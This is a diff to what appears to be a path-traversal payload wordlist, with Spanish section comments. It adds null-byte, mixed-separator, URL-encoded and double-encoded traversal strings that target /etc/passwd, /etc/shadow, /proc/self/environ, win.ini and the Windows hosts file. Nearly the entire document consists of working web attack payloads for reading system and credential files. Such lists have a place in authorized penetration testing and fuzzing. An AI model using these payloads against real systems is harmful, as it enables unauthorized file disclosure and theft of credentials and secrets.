@@ -18,6 +18,19 @@
 \..\..\..\..\..\..\..\..\..\..\C:\Windows\System32\drivers\etc\hosts
 ..\..\..\..\..\..\..\..\..\..\C:\Windows\System32\drivers\etc\hosts
 
+/../../../../../../../../../../etc/passwd%00.png
+../../../../../../../../../../etc/passwd%00.png
+/../../../../../../../../../../etc/shadow%00.png
+../../../../../../../../../../etc/shadow%00.png
+/../../../../../../../../../../proc/self/environ%00.png
+../../../../../../../../../../proc/self/environ%00.png
+\..\..\..\..\..\..\..\..\..\..\windows\win.ini%00.png
+..\..\..\..\..\..\..\..\..\..\windows\win.ini%00.png
+\..\..\..\..\..\..\..\..\..\..\C:\Windows\win.ini%00.png
+..\..\..\..\..\..\..\..\..\..\C:\Windows\win.ini%00.png
+\..\..\..\..\..\..\..\..\..\..\C:\Windows\System32\drivers\etc\hosts%00.png
+..\..\..\..\..\..\..\..\..\..\C:\Windows\System32\drivers\etc\hosts%00.png
+
 /....//....//....//....//....//....//....//etc/passwd
 ....//....//....//....//....//....//....//etc/passwd
 /....//....//....//....//....//....//....//etc/shadow
@@ -30,6 +43,19 @@
 ....\\....\\....\\....\\....\\....\\....\\C:\Windows\win.ini
 \....\\....\\....\\....\\....\\....\\....\\C:\Windows\System32\drivers\etc\hosts
 ....\\....\\....\\....\\....\\....\\....\\C:\Windows\System32\drivers\etc\hosts
+
+/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/....\/etc/passwd
+/....\/....\/....\/....\/....\/....\/....\/etc/shadow
+....\/....\/....\/....\/....\/....\/....\/etc/shadow
+/....\/....\/....\/....\/....\/....\/....\/proc/self/environ
+....\/....\/....\/....\/....\/....\/....\/proc/self/environ
+\....\/....\/....\/....\/....\/....\/....\/windows\win.ini
+....\/....\/....\/....\/....\/....\/....\/windows\win.ini
+\....\/....\/....\/....\/....\/....\/....\/C:\Windows\win.ini
+....\/....\/....\/....\/....\/....\/....\/C:\Windows\win.ini
+\....\/....\/....\/....\/....\/....\/....\/C:\Windows\System32\drivers\etc\hosts
+....\/....\/....\/....\/....\/....\/....\/C:\Windows\System32\drivers\etc\hosts
 
 /..//..//..//..//..//..//..//..//..//..//..//etc/passwd
 ..//..//..//..//..//..//..//..//..//..//..//etc/passwd
@@ -44,28 +70,47 @@
 \..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\C:\Windows\System32\drivers\etc\hosts
 ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\C:\Windows\System32\drivers\etc\hosts
 
-/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+# Codificación: / y \ 
+
+%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
-/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
+%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
-/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/self/environ
+%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/self/environ
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/self/environ
-\..%5..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CCwindows\win.ini
+%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CCwindows\win.ini
 ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows\win.ini
-\..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CC:\Windows\win.ini
+%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CC:\Windows\win.ini
 ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CC:\Windows\win.ini
-\..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CC:\Windows\System32\drivers\etc\hosts
+%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CC:\Windows\System32\drivers\etc\hosts
 ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CC:\Windows\System32\drivers\etc\hosts
 
-/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+# Codificación: ../ y ..\ 
+
+%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
-/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
+%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
-/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fproc/self/environ
+%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fproc/self/environ
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fproc/self/environ
-\%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows\win.ini
-%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows\win.ini
-\%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fC:\Windows\win.ini
-%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fC:\Windows\win.ini
-\%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fC:\Windows\System32\drivers\etc\hosts
-%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fC:\Windows\System32\drivers\etc\hosts
+%5C%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5Cwindows\win.ini
+%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5Cwindows\win.ini
+%5C%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5CC:\Windows\win.ini
+%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5CC:\Windows\win.ini
+%5C%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5CC:\Windows\System32\drivers\etc\hosts
+%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5C%2e%2e%5CC:\Windows\System32\drivers\etc\hosts
+
+# Doble odificación: ../ y ..\ 
+
+%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
+%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fproc/self/environ
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fproc/self/environ
+%255C%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255Cwindows\win.ini
+%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255Cwindows\win.ini
+%255C%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255CC:\Windows\win.ini
+%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255CC:\Windows\win.ini
+%255C%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255CC:\Windows\System32\drivers\etc\hosts
+%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255C%252e%252e%255CC:\Windows\System32\drivers\etc\hosts
